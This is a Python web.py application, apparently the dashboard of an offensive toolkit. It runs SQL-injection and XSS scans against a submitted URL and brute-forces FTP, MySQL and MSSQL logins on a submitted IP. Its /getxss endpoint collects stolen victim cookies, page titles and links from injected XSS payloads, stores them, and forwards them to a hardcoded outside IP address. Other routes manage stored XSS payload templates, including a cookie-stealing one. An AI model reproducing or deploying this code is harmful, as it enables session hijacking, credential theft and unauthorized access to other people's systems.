# encoding=utf-8
from Scrack import Scrack
from Sqlmap import sql
from XSS import XSS
from sqlDB import SQLConnect
import web
import json
import requests
web.config.debug=False
def geturl(content):
    '''
    :param content: 输入ip或url
    :return: 字典格式的数据
    '''
    if 'http' in content:
        data={}
        sql_data=json.loads(sql.sql(content))
        xss_data=json.loads(XSS.xss(content))
        data['sql']=sql_data.get('url') if sql_data.get('status')=='1' else sql_data.get('dec')
        data['xss']=xss_data.get('url') if xss_data.get('status')=='1' else xss_data.get('dec')
        return data
    else:
        data={}
        ftp_data=json.loads(Scrack.ftp(content))
        mysql_data=json.loads(Scrack.mysql(content))
        mssql_data=json.loads(Scrack.mssql(content))
        data['ftp'] = ftp_data.get('user')+'&'+ftp_data.get('pwd') if ftp_data.get('status') == '1' else ftp_data.get('dec')
        data['mysql'] = mysql_data.get('user')+'&'+mysql_data.get('pwd') if mysql_data.get('status') == '1' else mysql_data.get('dec')
        data['mssql'] = mssql_data.get('user')+'&'+mssql_data.get('pwd') if mssql_data.get('status') == '1' else mssql_data.get('dec')
        return data
urls=(
    '/scrack','scrack',
    '/csql','csql',
    '/xss','xss',
    '/index','index',
    '/login','login',
    '/createxsspro','createxsspro',
    '/getxss','getxss',
    '/getxssmodelname','getxssmodelname',
    '/xssindex','xssindex',
    '/lookxssinfo','lookxssinfo'
)
temp=web.template.render('temp')
app=web.application(urls,globals())
session = web.session.Session(app, web.session.DiskStore('sessions'), initializer={'logged_in':False})
class index:
    def GET(self):
        if not session.get('logged_in',False):
            return temp.fuzz(temp.index(False), None, None)
        return temp.fuzz(temp.index(True),None,None)
    def POST(self):
        '''
        获取url或ip地址
        :return: 返回测试结果
        '''
        n=web.input()
        curl=n.get('url')
        return temp.fuzz(temp.index(True), curl, geturl(curl))
class login:
    def GET(self):
        if not session.get('logged_in', False):
            return temp.login(temp.index(False))
        else:
            session.logged_in=False
            web.seeother('/index')
    def POST(self):
        n=web.input()
        user=n.get('username')
        pwd=n.get('password')
        if '\'' in user:
            web.seeother('/index')
        if SQLConnect.login(user,pwd):
            session.logged_in = True
            web.seeother('/scrack')
        else:
            web.seeother('/index')
class scrack:
    def GET(self):
        data=SQLConnect.getscrack()
        if not session.get('logged_in', False):
            web.seeother('/index')
        return temp.scrack(temp.index(True),data)
class xss:
    def GET(self):
        data=SQLConnect.getxsssql('xss')
        if not session.get('logged_in', False):
            web.seeother('/index')
        return temp.xsql(temp.index(True), data)
class csql:
    def GET(self):
        data=SQLConnect.getxsssql('sql')
        if not session.get('logged_in', False):
            web.seeother('/index')
        return temp.xsql(temp.index(True), data)
class getxss:
    ''''
    接受xss的模块
    '''
    def GET(self):
        user=web.input()
        SQLConnect.insertre(user.get('title'),user.get('href'),user.get('cookie'))
        url ="http://112.74.204.232:7777/message?title=%s&href=%s" %(user.get('title'),user.get('href'))
        #requests.post("http://112.74.204.252:7777/message",data={'title':user.get('title'),'href':user.get('href')})
        requests.get(url)
class getxssmodelname:
    def GET(self):
        if not session.get('logged_in', False):
            web.seeother('/index')
        title=web.input()
        title=title.get('title')
        return temp.xsspyloadinfo(SQLConnect.getxsspayload(title))
class xssindex:
    def GET(self):
        if not session.get('logged_in', False):
            web.seeother('/index')
        return temp.xssindex(temp.index(True),SQLConnect.getmodelname(),SQLConnect.getxsspayloadname(),None,None,None)
class lookxssinfo:
    def GET(self):
        if not session.get('logged_in', False):
            web.seeother('/index')
        title=web.input()
        return temp.xssindex(temp.index(True), SQLConnect.getmodelname(), SQLConnect.getxsspayloadname(), SQLConnect.getmodelinfo(title.get('title')), title.get('title'),SQLConnect.getxsspayload('cookie') %title.get('title'))
class createxsspro:
    def POST(self):
        n=web.input()
        title=n.get('title')
        content=n.get('content')
        if SQLConnect.createxsspro(title,content):
            web.seeother('/xssindex')
        else:
            return "<script>alert('Error')</script>"
if __name__ == '__main__':
    app.run()